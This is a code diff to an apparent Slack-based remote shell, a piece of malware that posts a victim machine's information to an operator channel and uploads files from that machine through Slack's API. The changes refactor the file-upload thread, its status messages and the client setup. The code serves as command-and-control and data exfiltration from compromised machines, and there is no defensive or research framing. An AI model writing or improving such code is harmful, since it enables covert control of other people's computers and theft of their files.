@@ -34,8 +34,7 @@ def prepare_shell():
     channel_id = channel.__getitem__("channel")["id"]
 
     # Add operators to the 'sierra-hotel-'
-    client.conversations_invite(channel=channel_id,
-                                users=operators)
+    client.conversations_invite(channel=channel_id, users=operators)
 
     # Gather the victim's info and post it to 'sierra-hotel-'
     info = machine_info()
@@ -119,48 +118,52 @@ def machine_info():
 uploaderThreadResult = ""
 uploading = False
 
+
 def uploader_thread(filename):
     global uploaderThreadResult
     global uploading
 
     uploaderThreadResult = ""
     uploading = True
-    try:
-        out = client.files_upload(
-            file=filename,
-            channels=channel_id,
-            filename=filename,
-            title=filename
-        )
+
+    if os.path.exists(filename):
+        client.chat_postMessage(channel=channel_id,
+                                text=f"Please wait while your "
+                                "file is uploaded.")
+
+        out = client.files_upload(file=filename,
+                                  channels=channel_id,
+                                  filename=filename,
+                                  title=filename)
 
         uploaderThreadResult = f"Uploaded `{filename}`"
-    except FileNotFoundError:
+
+    else:
         uploaderThreadResult = "File not found."
 
     uploading = False
 
+
 def upload(data):
     try:
-        threading.Thread(
-            target=uploader_thread,
-            daemon=True,
-            args=(data,)
-        ).start()
+        threading.Thread(target=uploader_thread,
+                         daemon=True,
+                         args=(data,)).start()
 
         while uploading:
             try:
-                client.chat_postMessage(
-                    channel=channel_id,
-                    text=f"Please wait while your file is uploading."
-                )
+                pass
+
             except:
                 pass
 
-            time.sleep(10)
+        client.chat_postMessage(channel=channel_id,
+                                text=uploaderThreadResult)
 
-        return uploaderThreadResult
     except threading.ThreadError:
-        return "Cannot start uploader thread."
+        client.chat_postMessage(channel=channel_id,
+                                text="Cannot start uploader thread")
+
 
 def handle_user_input(command):
     output = ""
@@ -268,7 +271,7 @@ if platform.system() == "Windows":
 
 operators = config.member_id
 channel_prefix = config.channel_prefix
-client = slack.WebClient(token=config.bot_user_oauth_token, timeout=0)
+client = slack.WebClient(token=config.bot_user_oauth_token)
 
 if __name__ == "__main__":
     prepare_shell()
